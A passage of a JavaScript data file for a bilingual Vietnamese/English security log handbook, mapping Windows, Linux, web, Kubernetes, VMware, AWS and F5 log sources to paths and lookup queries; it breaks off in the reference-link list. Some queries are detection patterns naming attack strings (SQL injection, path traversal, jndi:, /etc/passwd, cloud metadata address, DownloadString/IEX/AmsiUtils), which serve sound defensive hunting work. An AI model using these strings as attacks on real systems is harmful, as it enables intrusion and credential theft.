/* data.js — content data for the Security Log Handbook (log sources, reference links, ATT&CK linking, and all 276 bilingual entries). Classic script (no import/export) so Log_handbook.html keeps working when opened via file://. Loaded before the main inline script. */

const R = String.raw;

const GROUPS = [
  {k:"win", label:"Windows", token:"windows"},
  {k:"lin", label:"Linux", token:"linux"},
  {k:"web", label:"Access log", token:"access"},
  {k:"k8s", label:"Kubernetes", token:"k8s"},
  {k:"vc",  label:"vCenter", token:"vcenter"},
  {k:"esx", label:"ESXi", token:"esxi"}
,
  {k:"aws", label:"AWS", token:"aws"},
  {k:"f5", label:"F5 BIG-IP", token:"f5"}
];

const SEV_I18N = {
  vi: {c:"Nghiêm trọng", h:"Cao", m:"Trung bình", i:"Tham khảo"},
  en: {c:"Critical", h:"High", m:"Medium", i:"Reference"}
};

const UI = {
  vi: {
    docTitle:"Sổ tra cứu log bảo mật", title:"Sổ tra cứu log",
    searchPlaceholder:"Tìm Event ID, từ khóa, ATT&CK… (4769, lsass, exec, heapdump, T1110)", searchAria:"Tìm kiếm",
    tabAll:"Tất cả", sourceGroupAria:"Nguồn log", sevGroupAria:"Mức ưu tiên giám sát", tocAria:"Mục lục",
    openAll:"Mở tất cả", closeAll:"Thu gọn tất cả",
    fieldsHeading:"Trường / giá trị cần biết", sampleHeading:"Mẫu log", queryHeading:"Lệnh tra cứu",
    copyLabel:"Sao chép", copiedLabel:"Đã chép",
    emptyStrong:"Không có mục khớp. ", emptyRest:"Thử bỏ bớt từ khóa, chọn tab Tất cả hoặc bật lại các mức ưu tiên.",
    statSuffix:"mục", refsLabel:"Nguồn tham khảo",
    footNote:"Mẫu log là bản minh họa đã rút gọn (Windows hiển thị dạng key=value như payload sau khi collector chuẩn hóa). Định dạng thực tế thay đổi theo phiên bản OS/sản phẩm, collector (WinCollect, NXLog, rsyslog) và cấu hình audit policy. Mức ưu tiên là gợi ý cho giám sát/săn mối đe dọa, không phải severity gốc của log.",
    langAria:"Ngôn ngữ"
  },
  en: {
    docTitle:"Security Log Reference Handbook", title:"Security Log Handbook",
    searchPlaceholder:"Search Event ID, keyword, ATT&CK… (4769, lsass, exec, heapdump, T1110)", searchAria:"Search",
    tabAll:"All", sourceGroupAria:"Log source", sevGroupAria:"Monitoring priority", tocAria:"Table of contents",
    openAll:"Expand all", closeAll:"Collapse all",
    fieldsHeading:"Fields to know", sampleHeading:"Sample log", queryHeading:"Query command",
    copyLabel:"Copy", copiedLabel:"Copied",
    emptyStrong:"No matching entries. ", emptyRest:"Try removing some keywords, switch to the All tab, or re-enable the priority filters.",
    statSuffix:"entries", refsLabel:"References",
    footNote:"Sample logs are simplified illustrations (Windows is shown as key=value, i.e. the payload after collector normalization). Real-world formats vary by OS/product version, collector (WinCollect, NXLog, rsyslog), and audit policy configuration. The priority level is a monitoring/threat-hunting suggestion, not the log's native severity.",
    langAria:"Language"
  }
};

/* Sources: key -> [name, path, note, query] */
const SRC = {
"aws-cloudtrail":["AWS CloudTrail (Sự kiện quản trị)", "S3 bucket được cấu hình làm đích của CloudTrail trail; cũng có thể tra cứu qua CloudTrail Event History (console/API, 90 ngày gần nhất), CloudWatch Logs (nếu trail được cấu hình gửi log), hoặc truy vấn SQL qua Athena/CloudTrail Lake trên dữ liệu lưu trong S3.", "Nên bật trail đa vùng (multi-region trail) và ghi log vào S3 vì CloudTrail Event History mặc định chỉ lưu 90 ngày quản trị sự kiện (management events); data events (ví dụ truy cập object S3, lời gọi hàm Lambda) không được ghi theo mặc định và phát sinh chi phí riêng nếu bật thêm.", "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=<EventName> --start-time 2026-10-20T00:00:00Z --end-time 2026-10-24T00:00:00Z --max-results 50"],
"aws-guardduty":["AWS GuardDuty (Findings)", "GuardDuty console (per-region) / Security Hub aggregation / exportable to S3 hoặc EventBridge (CloudWatch Events) để SIEM thu thập", "GuardDuty phải được bật riêng cho từng region và từng tài khoản (hoặc qua AWS Organizations delegated admin); finding JSON có thể xem trực tiếp trên console, qua GetFindings API, hoặc đẩy tự động sang S3/EventBridge để lưu trữ lâu dài vì GuardDuty chỉ giữ finding đã archive trong thời gian giới hạn. Cần chú ý: suppression rules và trusted IP list có thể âm thầm ẩn bớt finding, và severity của một finding type có thể thay đổi tùy ngữ cảnh (đánh dấu Variable).", "aws guardduty list-findings --detector-id <detectorId> --finding-criteria '{\"Criterion\":{\"severity\":{\"Gte\":7}}}' | aws guardduty get-findings --detector-id <detectorId> --finding-ids <ids>"],
"aws-vpcflow":["AWS VPC Flow Logs", "Xuất bản tới CloudWatch Logs, Amazon S3 hoặc Amazon Data Firehose; cấu hình theo từng VPC/Subnet/ENI", "Định dạng mặc định (version 2) chỉ gồm 14 trường cơ bản (5-tuple, packets, bytes, action, log-status); các trường mở rộng như tcp-flags, pkt-srcaddr/pkt-dstaddr, flow-direction, vpc-id chỉ có khi tạo flow log ở custom format. Flow Logs chỉ ghi metadata của luồng traffic được gộp theo khoảng tối đa 10 phút (hoặc 1 phút với instance Nitro), hoàn toàn không chứa payload gói tin nên không thể dùng để soi nội dung độc hại bên trong traffic.", "fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, protocol, action\n| filter action=\"REJECT\"\n| stats count(*) as soLan by srcAddr, dstAddr, dstPort\n| sort soLan desc\n| limit 20"],
"aws-web":["Nhật ký truy cập Web/App AWS (S3 / ALB / CloudFront)", "S3 Server Access Logs: bucket đích được cấu hình tại Properties > Server access logging của từng bucket nguồn (mục tiêu không được trùng bucket nguồn); ALB Access Logs: bucket đích cấu hình tại Load Balancer > Attributes > Monitoring > Access logs, log được ghi dưới dạng s3://<bucket>/[prefix/]AWSLogs/<account-id>/elasticloadbalancing/<region>/<yyyy>/<mm>/<dd>/*.log.gz; CloudFront Access Logs (standard logging): bucket đích cấu hình tại Distribution > Settings > Logging (standard logging v1/v2, có thể gửi tới S3, CloudWatch Logs hoặc Data Firehose)", "Cả ba loại log này đều là tính năng tùy chọn (opt-in) và bị tắt mặc định, phải bật thủ công cho từng bucket/ALB/distribution; việc gửi log là best-effort, không đảm bảo đầy đủ 100% và có thể trễ từ vài phút đến vài giờ (CloudFront có thể trễ tới 24 giờ) nên không nên dùng làm bằng chứng forensic tức thời duy nhất.", "-- Athena, ví dụ tổng quát: đếm số request lỗi 4xx/5xx theo ngày trên bảng log đã tạo (s3_access_logs / alb_logs / cloudfront_logs)\nSELECT substr(requestdatetime,1,11) AS day, httpstatus, COUNT(*) AS cnt\nFROM s3_access_logs\nWHERE CAST(httpstatus AS INT) >= 400\nGROUP BY substr(requestdatetime,1,11), httpstatus\nORDER BY day DESC;"],
"f5-asm":["Nhật ký vi phạm ASM (F5 BIG-IP WAF)", "Cục bộ: BIG-IP GUI Security ▸ Event Logs ▸ Application ▸ Requests (lưu trong CSDL nội bộ của thiết bị); Từ xa: đích syslog được cấu hình trong Logging Profile của ASM (Local Traffic ▸ Profiles ▸ Security ▸ Logging), thường chuyển qua TCP/UDP syslog tới SIEM.", "Logging profile phải được gắn (attach) vào Virtual Server tương ứng thì vi phạm ASM mới được ghi lại; lưu trữ cục bộ trên BIG-IP có dung lượng và thời gian lưu giới hạn (cạnh tranh tài nguyên khi lưu lượng lớn) nên trong triển khai thực tế gần như luôn cấu hình Remote Storage (syslog) để đẩy log sang SIEM/kho log tập trung.", "tmsh list security log profile <profile_name> (kiểm tra cấu hình logging profile và đích remote storage); trên SIEM: index=f5_asm request_status=blocked | stats count by sig_names, attack_type, src_ip, uri | sort -count"],
"f5-ltm":["Log kết nối/traffic LTM (F5 BIG-IP)", "/var/log/ltm trên thiết bị BIG-IP (hoặc đích syslog từ xa nếu đã cấu hình remote logging)", "Theo mặc định, LTM ghi các sự kiện ở mức hệ thống (trạng thái pool/node/monitor, lỗi SSL, giới hạn kết nối, DoS) vào /var/log/ltm thông qua các tiến trình mcpd, tmm và bigd; để có log chi tiết theo từng luồng kết nối hoặc theo từng request HTTP cần cấu hình thêm Local Traffic logging profile hoặc iRule (ví dụ HSL::log) kèm High-Speed Logging (HSL) gửi tới syslog-ng/Splunk ở xa.", "tail -f /var/log/ltm | grep -E \"01070638|01200012|01260009|01010240|01070921\""],
"f5-apm":["Log APM (Truy cập VPN/SSO)", "/var/log/apm trên thiết bị BIG-IP (và /var/log/audit, /var/log/messages); báo cáo phiên qua Access > Overview > Access Reports / Active Sessions trên giao diện quản trị; thường được chuyển tiếp qua remote high-speed logging (syslog) tới SIEM.", "Mức log mặc định của access policy là Notice (không ghi Session Variables); phải đặt log level của Access Policy (và của từng Access Policy Item qua mục Logging trong Visual Policy Editor) thành Informational hoặc Debug thì các session variable (session.*) mới xuất hiện trong /var/log/apm — do đó độ chi tiết của log phụ thuộc hoàn toàn vào cách thiết kế access policy.", "tmsh show apm access-policy access-session-id ... ; hoặc trên bash: sessiondump --allkeys <session_id> ; tail -f /var/log/apm | grep '<session_id>' ; hoặc trên SIEM: index=f5_apm sourcetype=f5:bigip:apm (\"Access policy result\" OR \"access_denied\")"],
"f5-audit":["Audit Log (thay đổi cấu hình qua tmsh/mcpd)", "/var/log/audit on the BIG-IP (mcpd AUDIT facility, syslog message ID 01070417); the raw tmsh command text is additionally logged under message ID 01420002; recent changes can also be reviewed via tmsh and the config-sync/UCS history", "Mức độ audit logging được cấu hình bằng biến hệ thống config.auditing (disable/enable/verbose/all, mặc định là enable từ BIG-IP 11.6.0 trở đi); mỗi lần một đối tượng cấu hình (user, virtual server, pool, policy ASM, db variable...) được tạo/sửa/xóa, mcpd ghi ra một dòng AUDIT riêng trong /var/log/audit kèm user, client (tmsh hoặc tmui), transaction id và nội dung thuộc tính thay đổi.", "grep AUDIT /var/log/audit | tail -50   # hoặc: tmsh show sys db config.auditing"],

"win-sec":["Security", R`%SystemRoot%\System32\winevt\Logs\Security.evtx`, "Nhiều ID chỉ xuất hiện khi bật Advanced Audit Policy tương ứng (kiểm tra: auditpol /get /category:*). Trên DC cần bật Kerberos, Account Logon, DS Access; trên server cần Process Creation kèm command line.", R`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)} |
  Select-Object TimeCreated, Id, Message -First 20`],
"win-sys":["System", R`%SystemRoot%\System32\winevt\Logs\System.evtx`, "Luôn bật mặc định. Nguồn quan trọng cho service mới (7045) và dấu vết xóa log (104).", R`Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045,7040,104} -MaxEvents 50`],
"win-def":["Microsoft Defender", "Microsoft-Windows-Windows Defender/Operational", "Nếu SentinelOne là AV chính, Defender thường ở passive mode, nhưng 5001/5007 vẫn đáng giữ để bắt hành vi tắt bảo vệ.", R`Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' |
  Where-Object Id -in 1116,1117,5001,5007 | Select -First 30`],
"win-ps":["PowerShell", "Microsoft-Windows-PowerShell/Operational; Windows PowerShell (classic)", "Bật Script Block Logging và Module Logging qua GPO: Administrative Templates > Windows Components > Windows PowerShell.", R`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
  Where-Object { $_.Message -match 'FromBase64String|DownloadString|IEX|AmsiUtils' }`],
"win-sysmon":["Sysmon", "Microsoft-Windows-Sysmon/Operational", "Cần cài Sysmon kèm cấu hình (vd. SwiftOnSecurity/sysmon-config hoặc olafhartong/sysmon-modular). Bổ trợ tốt cho EDR khi cần đưa telemetry vào SIEM.", R`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10} |
  Where-Object { $_.Message -match 'lsass.exe' } | Select -First 20`],
"win-rdp":["Remote Desktop", "TerminalServices-RemoteConnectionManager/Operational; TerminalServices-LocalSessionManager/Operational; RemoteDesktopServices-RdpCoreTS/Operational; TerminalServices-RDPClient/Operational", "Ghép chuỗi 1149 → 4624 (LogonType 10) → 21/22 → 24/25 → 23 để dựng lại một phiên RDP.", R`Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational' |
  Where-Object Id -eq 1149 | Select TimeCreated, Message -First 20`],
"win-task":["Task Scheduler", "Microsoft-Windows-TaskScheduler/Operational", "Log này mặc định có thể bị tắt trên một số bản Windows. Bật: wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true", R`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TaskScheduler/Operational'; Id=106,141}`],
"win-oth":["Khác: WMI, WinRM, BITS, AppLocker, Firewall, NTLM, DS", "Applications and Services Logs\\Microsoft\\Windows\\...", "Các kênh Operational riêng; nhiều kênh cần bật hoặc cấu hình thêm trước khi có dữ liệu.", R`Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 -and $_.LogName -match 'WMI|WinRM|Bits|AppLocker|Firewall' }`],

"lin-auth":["Authentication", "/var/log/auth.log (Debian/Ubuntu); /var/log/secure (RHEL/CentOS/Rocky); journald", "sshd, sudo, su, PAM, useradd/usermod/passwd đều ghi vào đây.", R`grep -E "Failed password|Invalid user" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
journalctl -u sshd --since "1 hour ago"`],
"lin-sys":["System / syslog / journald", "/var/log/syslog (Debian/Ubuntu); /var/log/messages (RHEL); /var/log/kern.log; journalctl", "Kernel, cron, systemd, package manager. Với host chỉ dùng journald, cần cấu hình Storage=persistent để log còn sau reboot.", R`journalctl -k --since today | grep -iE "promiscuous|taints kernel|segfault|Out of memory"
grep CRON /var/log/syslog | grep -vE "run-parts|debian-sa1" | tail -50`],
"lin-acct":["Phiên đăng nhập (wtmp/btmp/lastlog)", "/var/log/wtmp; /var/log/btmp; /var/log/lastlog; /var/run/utmp", "File nhị phân, đọc bằng last/lastb/lastlog/who. Kẻ tấn công thường xóa hoặc sửa các file này.", R`last -Fai | head -30
lastb -Fai | head -30`],
"lin-audit":["auditd", "/var/log/audit/audit.log; rules tại /etc/audit/rules.d/*.rules", "Một sự kiện gồm nhiều record cùng số serial trong msg=audit(epoch:serial). auid là UID đăng nhập gốc, giữ nguyên khi sudo/su (auid=4294967295 nghĩa là chưa gán, thường là daemon). Bộ rule tham khảo: Neo23x0/auditd, Florian Roth.", R`ausearch -k identity -i --start today
aureport -au --failed -i | tail
aureport -x --summary -i | head`],

"web-acc":["Apache / Nginx / Tomcat", "/var/log/nginx/access.log; /var/log/httpd/access_log; /var/log/apache2/access.log; Tomcat: logs/localhost_access_log.*.txt", R`Combined format: %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i". Nên thêm request time và X-Forwarded-For nếu đứng sau LB/WAF.`, R`awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
awk '{print $9}' access.log | sort | uniq -c | sort -rn`],
"web-iis":["IIS (W3C)", R`%SystemDrive%\inetpub\logs\LogFiles\W3SVC<siteID>\u_exYYMMDD.log`, "Thời gian ghi theo UTC mặc định. Header #Fields: ở đầu file cho biết thứ tự cột.", R`Select-String -Path 'C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log' -Pattern ' POST .*\.aspx ' | Select -First 30`],
"web-atk":["Mẫu tấn công trong access log", "Áp dụng cho mọi web server / WAF / reverse proxy", "Payload thường bị URL-encode; giải mã trước khi so khớp. Request body (POST) không có trong access log, cần WAF hoặc app log.", R`grep -iE "union(%20|\+| )+select|\.\./|%2e%2e|jndi:|/etc/passwd|<script|169\.254\.169\.254" access.log`],

"k8s-audit":["kube-apiserver audit log", "--audit-log-path (vd. /var/log/kubernetes/audit.log); OpenShift: /var/log/kube-apiserver/audit.log trên master; EKS/AKS/GKE: qua cloud logging", "Level: None, Metadata, Request, RequestResponse (đặt trong --audit-policy-file). Stage: RequestReceived, ResponseStarted, ResponseComplete, Panic. Phát hiện cấu hình pod nguy hiểm cần level Request trở lên. minikube KHÔNG bật audit log mặc định (kiểm tra command của kube-apiserver sẽ không thấy --audit-log-path/--audit-policy-file) — phải bật thủ công qua: minikube start --extra-config=apiserver.audit-policy-file=<path> --extra-config=apiserver.audit-log-path=<path> (và mount thư mục chứa policy file vào máy minikube).", R`jq -c 'select(.objectRef.subresource=="exec") | {t:.requestReceivedTimestamp,u:.user.username,ns:.objectRef.namespace,pod:.objectRef.name}' audit.log
oc adm node-logs --role=master --path=kube-apiserver/audit.log`],
"k8s-comp":["Component & container log", "kubelet, containerd/CRI-O: journald trên node; control plane static pod: kubectl logs -n kube-system; container: /var/log/pods/<ns>_<pod>_<uid>/<container>/N.log", "Định dạng klog: <Level><MMDD> <hh:mm:ss.us> <pid> <file:line>] message (I=info, W=warn, E=error, F=fatal).", R`journalctl -u kubelet --since "1 hour ago" | grep -E "^.{0,40}E[0-9]{4}"
kubectl logs -n <ns> <pod> -c <container> --previous`],
"k8s-ev":["Kubernetes Events", "Object Event lưu trong etcd, TTL mặc định khoảng 1 giờ", "Cần đẩy ra ngoài (event exporter, Fluent Bit, OpenShift logging) nếu muốn giữ để điều tra.", R`kubectl get events -A --sort-by=.lastTimestamp --field-selector type=Warning`],

"vc-ev":["vCenter events (vim.event.*)", "Lưu trong vCenter DB; xem tại Monitor > Events; forward qua VAMI https://<vcsa>:5480 > Syslog", "Tên sự kiện dạng vim.event.<Tên> hoặc com.vmware.*. Khi forward syslog, nội dung nằm trong vpxd/vpxd-svcs.", R`# PowerCLI
Get-VIEvent -Start (Get-Date).AddDays(-1) -MaxSamples 5000 |
  Where-Object { $_ -is [VMware.Vim.BadUsernameSessionEvent] } |
  Select CreatedTime, UserName, FullFormattedMessage`],
"vc-sso":["vCenter SSO", "/var/log/audit/sso-events/audit_events.log; /var/log/vmware/sso/websso.log; /var/log/vmware/sso/vmware-identity-sts.log", "audit_events.log ghi dạng JSON từng dòng, phù hợp parse trên SIEM.", R`grep -E "LoginFailure|PrincipalManagement" /var/log/audit/sso-events/audit_events.log | tail -50`],
"vc-file":["vCenter file log", "/var/log/vmware/vpxd/vpxd.log; /var/log/vmware/vsphere-ui/logs/; /var/log/vmware/applmgmt/ (VAMI); /var/log/vmware/vpxd-svcs/", "vpxd.log rất ồn; tìm theo opID để nối tác vụ từ UI tới host.", R`grep -E "BEGIN task-|vim.VirtualMachine.(powerOff|destroy)" /var/log/vmware/vpxd/vpxd.log | tail -50`],

"esx-file":["ESXi file log", "/var/log/ → /scratch/log (symlink); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/vmkernel.log; /var/log/vobd.log; /var/log/syslog.log; /var/log/fdm.log; /var/log/esxupdate.log", "Nếu không có scratch persistent, log mất khi reboot. Luôn forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ có audit record: esxcli system auditrecords local enable / remote enable.", R`grep -E "Accepted|PAM|Authentication failure" /var/log/auth.log | tail
tail -100 /var/log/shell.log`],
"esx-ev":["ESXi events (esx.audit.* / VOB)", "/var/log/vobd.log, hostd.log; đồng thời đẩy lên vCenter events", "Các ID esx.audit.* là nguồn tốt để cảnh báo thay đổi bảo mật trên host.", R`grep -E "esx\.audit\." /var/log/vobd.log | tail -50`]
};

/* English name/note overrides for SRC, keyed the same way: key -> [name, note] (path/query are language-neutral and reused from SRC) */
const EN_SRC = {
"aws-cloudtrail":["AWS CloudTrail (Management Events)", "Enable a multi-region trail and deliver logs to S3, since the default CloudTrail Event History only retains 90 days of management events; data events (e.g. S3 object-level access, Lambda invocations) are not logged by default and incur additional cost if enabled.", "The S3 bucket configured as the CloudTrail trail's destination; also queryable via CloudTrail Event History (console/API, last 90 days), CloudWatch Logs (if the trail is configured to deliver there), or SQL via Athena/CloudTrail Lake over the data stored in S3."],
"aws-guardduty":["AWS GuardDuty (Findings)", "GuardDuty must be enabled per region (and per account, or centrally via AWS Organizations delegated admin); finding JSON can be viewed on the console, pulled via the GetFindings API, or auto-exported to S3/EventBridge for long-term retention since GuardDuty itself ages out archived findings. Watch out: suppression rules and trusted IP lists can silently hide findings, and some finding types have variable severity depending on context.", "GuardDuty console (per-region) / Security Hub aggregation / exportable to S3 or EventBridge (CloudWatch Events) for SIEM ingestion"],
"aws-vpcflow":["AWS VPC Flow Logs", "The default format (version 2) includes only 14 base fields (5-tuple, packets, bytes, action, log-status); extended fields such as tcp-flags, pkt-srcaddr/pkt-dstaddr, flow-direction, or vpc-id require a custom-format flow log. Flow Logs capture only traffic metadata aggregated over up to a 10-minute window (or 1 minute on Nitro-based instances) and never packet payload, so they cannot reveal malicious content inside the traffic itself.", "Published to CloudWatch Logs, Amazon S3, or Amazon Data Firehose; configured per VPC/Subnet/ENI"],
"aws-web":["AWS Web/App Access Log (S3 / ALB / CloudFront)", "All three logging types are opt-in and disabled by default, requiring manual configuration per bucket/load balancer/distribution. Delivery is best-effort (not guaranteed complete) and can lag from a few minutes up to several hours (CloudFront up to 24 hours in rare cases), so these logs should be correlated with CloudTrail/WAF logs rather than used as the sole real-time source.", "S3 Server Access Logs: destination bucket configured under Properties > Server access logging on each source bucket (the target must not be the same as the source bucket); ALB Access Logs: destination bucket configured under Load Balancer > Attributes > Monitoring > Access logs, written as s3://<bucket>/[prefix/]AWSLogs/<account-id>/elasticloadbalancing/<region>/<yyyy>/<mm>/<dd>/*.log.gz; CloudFront Access Logs (standard logging): destination bucket configured under Distribution > Settings > Logging (standard logging v1/v2, can be sent to S3, CloudWatch Logs, or Data Firehose)"],
"f5-asm":["F5 BIG-IP ASM (WAF) Violation Log", "The ASM logging profile must be attached to the relevant virtual server for violations to be recorded; local on-box storage has limited capacity/retention and can compete for system resources under high traffic, so production deployments standardly configure Remote Storage (syslog) to forward events to a SIEM or centralized log store.", "Local: BIG-IP GUI Security ▸ Event Logs ▸ Application ▸ Requests (stored in the device's internal database); Remote: the syslog destination configured in ASM's Logging Profile (Local Traffic ▸ Profiles ▸ Security ▸ Logging), usually forwarded over TCP/UDP syslog to a SIEM."],
"f5-ltm":["F5 BIG-IP LTM Connection/Traffic Log", "By default LTM writes system-level events (pool/node/monitor status, SSL errors, connection limits, DoS detections) to /var/log/ltm via the mcpd, tmm, and bigd daemons; granular per-connection or per-HTTP-request logging requires an explicit Local Traffic logging profile or an iRule (e.g. HSL::log) plus remote High-Speed Logging (HSL) to a syslog-ng/Splunk destination.", "/var/log/ltm on the BIG-IP device (or a remote syslog destination if remote logging is configured)"],
"f5-apm":["APM Access Log (VPN/SSO)", "The default Access Policy log level is Notice, which does NOT log Session Variables; the Access Policy (and per-item Logging settings in the Visual Policy Editor) must be set to Informational or Debug for session.* variables to appear in /var/log/apm — so the richness of these logs depends entirely on how each access policy was built.", "/var/log/apm on the BIG-IP device (plus /var/log/audit, /var/log/messages); session reports via Access > Overview > Access Reports / Active Sessions in the admin UI; usually forwarded via remote high-speed logging (syslog) to a SIEM."],
"f5-audit":["Audit Log (tmsh/mcpd Configuration Changes)", "The audit logging level is controlled by the config.auditing system DB variable (disable/enable/verbose/all; enabled by default since BIG-IP 11.6.0). Each time a configuration object (user, virtual server, pool, ASM policy, db variable, etc.) is created, modified, or deleted, mcpd writes a dedicated AUDIT line to /var/log/audit containing the acting user, client (tmsh or tmui), transaction id, and the changed attributes."],

"win-sec":["Security", "Many IDs only appear once the matching Advanced Audit Policy subcategory is enabled (check with: auditpol /get /category:*). On a DC, enable Kerberos, Account Logon, DS Access; on a server, enable Process Creation with command-line auditing."],
"win-sys":["System", "Always on by default. The best source for new services (7045) and log-clearing traces (104)."],
"win-def":["Microsoft Defender", "If SentinelOne is the primary AV, Defender usually runs in passive mode, but 1116/1117/5001/5007 are still worth keeping to catch attempts to disable protection."],
"win-ps":["PowerShell", "Enable Script Block Logging and Module Logging via GPO: Administrative Templates > Windows Components > Windows PowerShell."],
"win-sysmon":["Sysmon", "Requires Sysmon with a config (e.g. SwiftOnSecurity/sysmon-config or olafhartong/sysmon-modular). A strong complement to EDR telemetry feeding a SIEM."],
"win-rdp":["Remote Desktop", "Chain 1149 → 4624 (LogonType 10) → 21/22 → 24/25 → 23 to reconstruct an RDP session."],
"win-task":["Task Scheduler", "This log can be disabled by default on some Windows builds. Enable it: wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true"],
"win-oth":["Other: WMI, WinRM, BITS, AppLocker, Firewall, NTLM, DS", "Separate Operational channels; many need to be enabled or configured before they produce data."],
"lin-auth":["Authentication", "sshd, sudo, su, PAM, and useradd/usermod/passwd all log here."],
"lin-sys":["System / syslog / journald", "Kernel, cron, systemd, package manager. On a host using journald only, set Storage=persistent so logs survive a reboot."],
"lin-acct":["Login sessions (wtmp/btmp/lastlog)", "Binary files, read with last/lastb/lastlog/who. Attackers often delete or tamper with these files."],
"lin-audit":["auditd", "One event comprises multiple records sharing a serial number in msg=audit(epoch:serial). auid is the original login UID and stays unchanged across sudo/su (auid=4294967295 means unset, usually a daemon). Reference rule sets: Neo23x0/auditd, Florian Roth.", "/var/log/audit/audit.log; rules under /etc/audit/rules.d/*.rules"],
"web-acc":["Apache / Nginx / Tomcat", "Combined format: %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\". Add request time and X-Forwarded-For if sitting behind an LB/WAF."],
"web-iis":["IIS (W3C)", "Timestamps are UTC by default. The #Fields: header at the top of the file gives the column order."],
"web-atk":["Attack patterns in access logs", "Payloads are usually URL-encoded; decode before matching. The request body (POST) isn't in the access log — a WAF or app log is needed for that.", "Applies to any web server / WAF / reverse proxy"],
"k8s-audit":["kube-apiserver audit log", "Level: None, Metadata, Request, RequestResponse (set in --audit-policy-file). Stage: RequestReceived, ResponseStarted, ResponseComplete, Panic. Detecting dangerous pod configs requires at least Request level. minikube does NOT enable audit logging by default (the kube-apiserver command has no --audit-log-path/--audit-policy-file flag) — enable it manually via: minikube start --extra-config=apiserver.audit-policy-file=<path> --extra-config=apiserver.audit-log-path=<path> (and mount the host directory holding the policy file into the minikube VM).", "--audit-log-path (e.g. /var/log/kubernetes/audit.log); OpenShift: /var/log/kube-apiserver/audit.log on the master; EKS/AKS/GKE: via cloud logging"],
"k8s-comp":["Component & container log", "klog format: <Level><MMDD> <hh:mm:ss.us> <pid> <file:line>] message (I=info, W=warn, E=error, F=fatal).", "kubelet, containerd/CRI-O: journald on the node; control plane static pod: kubectl logs -n kube-system; container: /var/log/pods/<ns>_<pod>_<uid>/<container>/N.log"],
"k8s-ev":["Kubernetes Events", "Ship them out (event exporter, Fluent Bit, OpenShift logging) to keep them for investigation.", "Object Events are stored in etcd, default TTL about 1 hour"],
"vc-ev":["vCenter events (vim.event.*)", "Event names look like vim.event.<Name> or com.vmware.*. When forwarded via syslog, the content lives in vpxd/vpxd-svcs.", "Stored in the vCenter DB; view under Monitor > Events; forward via VAMI https://<vcsa>:5480 > Syslog"],
"vc-sso":["vCenter SSO", "audit_events.log is written as one JSON object per line, convenient to parse in a SIEM."],
"vc-file":["vCenter file log", "vpxd.log is very noisy; search by opID to stitch a task from the UI through to the host."],
"esx-file":["ESXi file log", "If there's no persistent scratch partition, logs are lost on reboot. Always forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ has audit records: esxcli system auditrecords local enable / remote enable.", "/var/log/ → /scratch/log (symlink); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/vmkernel.log; /var/log/vobd.log; /var/log/syslog.log; /var/log/fdm.log; /var/log/esxupdate.log"],
"esx-ev":["ESXi events (esx.audit.* / VOB)", "esx.audit.* IDs are a good source for alerting on security-relevant changes to a host.", "/var/log/vobd.log, hostd.log; also forwarded to vCenter events"]
};

/* Canonical reference docs per log source, filled in as entries are verified: key -> [{title, url}, ...] */
const SRC_REFS = {
"aws-cloudtrail": [
  {title:"CloudTrail record contents for management, data, and network activity events", url:"https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html"},
  {title:"CloudTrail userIdentity element", url:"https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-user-identity.html"},
  {title:"AWS Management Console sign-in events", url:"https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html"}
],
"aws-guardduty": [
  {title:"GuardDuty active finding types", url:"https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html"},
  {title:"Understanding GuardDuty findings", url:"https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_findings_understand.html"},
  {title:"GuardDuty IAM finding types", url:"https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html"}
],
"aws-vpcflow": [
  {title:"VPC Flow Logs - Flow log records (field reference)", url:"https://docs.aws.amazon.com/vpc/latest/userguide/flow-log-records.html"},
  {title:"VPC Flow Logs - Flow log record examples", url:"https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs-records-examples.html"},
  {title:"CloudWatch Logs Insights - Sample queries (VPC Flow Logs section)", url:"https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/CWL_QuerySyntax-examples.html"}
],
"aws-web": [
  {title:"Amazon S3 server access log format", url:"https://docs.aws.amazon.com/AmazonS3/latest/userguide/LogFormat.html"},
  {title:"Access logs for your Application Load Balancer", url:"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-access-logs.html"},
  {title:"Amazon CloudFront standard logging reference", url:"https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/standard-logs-reference.html"}
],
"f5-asm": [
  {title:"Working with Violations (BIG-IP ASM 17.5.0)", url:"https://techdocs.f5.com/en-us/bigip-17-5-0/big-ip-asm-implementations/working-with-violations.html"},
